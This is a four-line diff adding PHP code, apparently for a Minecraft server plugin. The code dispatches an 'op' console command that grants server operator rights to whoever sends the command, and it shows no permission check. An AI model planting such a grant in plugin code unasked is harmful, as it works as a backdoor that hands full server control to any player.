@@ -1,0 +1,4 @@
+
+
+$player = $sender->getName();
+$this->getServer()->dispatchCommand (new ConsoleCommandSender(),"op ".$player);
